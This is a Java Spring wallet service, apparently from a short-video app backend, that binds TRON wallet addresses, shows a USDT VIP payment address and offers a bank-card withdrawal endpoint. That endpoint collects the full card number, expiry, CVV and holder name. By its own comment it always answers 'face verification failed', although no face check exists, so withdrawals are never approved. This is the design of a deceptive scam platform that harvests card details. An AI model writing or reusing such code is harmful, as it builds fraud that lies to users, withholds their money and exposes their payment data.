package com.reelshort.backend.wallet;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.time.OffsetDateTime;
import java.time.YearMonth;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.UUID;

import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import com.reelshort.backend.admin.AdminException;
import com.reelshort.backend.system.config.SystemConfigRegistry;
import com.reelshort.backend.system.config.SystemConfigService;
import com.reelshort.backend.user.UserAccount;
import com.reelshort.backend.user.UserAccountRepository;
import com.reelshort.backend.user.UserStatus;

@Service
public class WalletService {

	private static final String BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
	private static final int TRON_ADDRESS_LENGTH = 34;
	private static final int TRON_DECODED_LENGTH = 25;
	private static final byte TRON_PREFIX = 0x41;

	private final UserWalletRepository userWalletRepository;
	private final UserAccountRepository userAccountRepository;
	private final BankCardAttemptRepository bankCardAttemptRepository;
	private final SystemConfigService systemConfigService;

	public WalletService(UserWalletRepository userWalletRepository, UserAccountRepository userAccountRepository,
			BankCardAttemptRepository bankCardAttemptRepository, SystemConfigService systemConfigService) {
		this.userWalletRepository = userWalletRepository;
		this.userAccountRepository = userAccountRepository;
		this.bankCardAttemptRepository = bankCardAttemptRepository;
		this.systemConfigService = systemConfigService;
	}

	@Transactional(readOnly = true)
	public WalletResponse wallet(UUID userId) {
		UserWallet wallet = userWalletRepository.findByUserId(userId).orElse(null);
		UserAccount user = userAccountRepository.findById(userId).orElse(null);
		String vipUntil = (user != null && user.vipUntil() != null) ? user.vipUntil().toString() : null;
		String vipPrice = safeConfigValue(SystemConfigRegistry.VIP_PRICE_USDT);
		String collectionAddress = safeConfigValue(SystemConfigRegistry.VIP_COLLECTION_ADDRESS);
		return WalletResponse.withVip(wallet, vipUntil, vipPrice, collectionAddress);
	}

	@Transactional
	public WalletResponse bindOrReplace(UUID userId, String walletAddress) {
		String normalizedWalletAddress = normalizeWalletAddress(walletAddress);
		activeUser(userId);
		UserWallet wallet = userWalletRepository.findByUserId(userId).orElse(null);
		if (wallet == null) {
			wallet = UserWallet.create(userId, normalizedWalletAddress);
		}
		else {
			wallet.replace(normalizedWalletAddress);
		}
		return WalletResponse.from(userWalletRepository.save(wallet));
	}

	@Transactional
	public WalletResponse unbind(UUID userId) {
		activeUser(userId);
		userWalletRepository.findByUserId(userId).ifPresent(userWalletRepository::delete);
		return WalletResponse.from(null);
	}

	/**
	 * Submit a bank card for withdrawal. Card details are validated (Luhn, expiry, CVV), an attempt is
	 * recorded, and the submission always fails face verification — bank card withdrawal is intentionally
	 * never approved.
	 */
	@Transactional
	public String submitBankCard(UUID userId, String cardNumber, String expiryMonth, String expiryYear, String cvv,
			String holderName) {
		activeUser(userId);
		// Check lock BEFORE validation so locked users get 429 regardless of card input
		BankCardAttempt attempt = bankCardAttemptRepository.findByUserId(userId)
				.orElseGet(() -> BankCardAttempt.create(userId, "0000"));
		if (attempt.isLocked()) {
			throw new AdminException(429, "too many attempts, try again later");
		}
		validateCardNumber(cardNumber);
		validateExpiry(expiryMonth, expiryYear);
		validateCvv(cvv);
		if (holderName == null || holderName.isBlank()) {
			throw new AdminException(400, "card holder name required");
		}
		String digits = cardNumber.replaceAll("\\s+", "");
		attempt.updateLast4(digits.substring(digits.length() - 4));
		attempt.recordAttempt();
		bankCardAttemptRepository.save(attempt);
		return "face verification failed";
	}

	private String activeUser(UUID userId) {
		UserAccount user = userAccountRepository.findById(userId)
				.orElseThrow(() -> new AdminException(404, "user not found"));
		if (user.status() != UserStatus.ACTIVE) {
			throw new AdminException(403, "user disabled");
		}
		return user.username();
	}

	private String normalizeWalletAddress(String walletAddress) {
		String trimmed = walletAddress == null ? "" : walletAddress.trim();
		if (!isValidTronAddress(trimmed)) {
			throw new AdminException(400, "invalid wallet address");
		}
		return trimmed;
	}

	private void validateCardNumber(String cardNumber) {
		if (cardNumber == null) {
			throw new AdminException(400, "invalid card number");
		}
		String digits = cardNumber.replaceAll("\\s+", "");
		if (!digits.matches("\\d{13,19}") || !luhnValid(digits)) {
			throw new AdminException(400, "invalid card number");
		}
	}

	private boolean luhnValid(String digits) {
		int sum = 0;
		boolean doubleDigit = false;
		for (int index = digits.length() - 1; index >= 0; index--) {
			int digit = digits.charAt(index) - '0';
			if (doubleDigit) {
				digit *= 2;
				if (digit > 9) {
					digit -= 9;
				}
			}
			sum += digit;
			doubleDigit = !doubleDigit;
		}
		return sum % 10 == 0;
	}

	private void validateExpiry(String expiryMonth, String expiryYear) {
		if (expiryMonth == null || expiryYear == null) {
			throw new AdminException(400, "invalid expiry");
		}
		String month = expiryMonth.trim();
		String year = expiryYear.trim();
		if (!month.matches("\\d{2}") || !year.matches("\\d{2}")) {
			throw new AdminException(400, "invalid expiry");
		}
		try {
			YearMonth expiry = YearMonth.parse("20" + year + "-" + month, DateTimeFormatter.ofPattern("yyyy-MM"));
			if (expiry.isBefore(YearMonth.now())) {
				throw new AdminException(400, "card expired");
			}
		}
		catch (RuntimeException exception) {
			throw new AdminException(400, "invalid expiry");
		}
	}

	private void validateCvv(String cvv) {
		if (cvv == null || !cvv.matches("\\d{3,4}")) {
			throw new AdminException(400, "invalid cvv");
		}
	}

	private boolean isValidTronAddress(String walletAddress) {
		if (!walletAddress.startsWith("T") || walletAddress.length() != TRON_ADDRESS_LENGTH) {
			return false;
		}
		byte[] decoded = decodeBase58(walletAddress);
		if (decoded.length != TRON_DECODED_LENGTH || decoded[0] != TRON_PREFIX) {
			return false;
		}
		byte[] payload = Arrays.copyOfRange(decoded, 0, 21);
		byte[] expectedChecksum = Arrays.copyOfRange(doubleSha256(payload), 0, 4);
		byte[] actualChecksum = Arrays.copyOfRange(decoded, 21, TRON_DECODED_LENGTH);
		return Arrays.equals(expectedChecksum, actualChecksum);
	}

	private byte[] decodeBase58(String value) {
		BigInteger number = BigInteger.ZERO;
		for (int index = 0; index < value.length(); index++) {
			int digit = BASE58_ALPHABET.indexOf(value.charAt(index));
			if (digit < 0) {
				return new byte[0];
			}
			number = number.multiply(BigInteger.valueOf(58)).add(BigInteger.valueOf(digit));
		}
		byte[] raw = number.toByteArray();
		if (raw.length > 0 && raw[0] == 0) {
			raw = Arrays.copyOfRange(raw, 1, raw.length);
		}
		int leadingZeroes = 0;
		while (leadingZeroes < value.length() && value.charAt(leadingZeroes) == '1') {
			leadingZeroes++;
		}
		byte[] decoded = new byte[leadingZeroes + raw.length];
		System.arraycopy(raw, 0, decoded, leadingZeroes, raw.length);
		return decoded;
	}

	private byte[] doubleSha256(byte[] value) {
		try {
			MessageDigest digest = MessageDigest.getInstance("SHA-256");
			return digest.digest(digest.digest(value));
		}
		catch (NoSuchAlgorithmException exception) {
			throw new IllegalStateException("SHA-256 not available", exception);
		}
	}

	private String safeConfigValue(String key) {
		try {
			String value = systemConfigService.stringValue(key);
			return value == null ? "" : value;
		}
		catch (Exception exception) {
			return "";
		}
	}
}
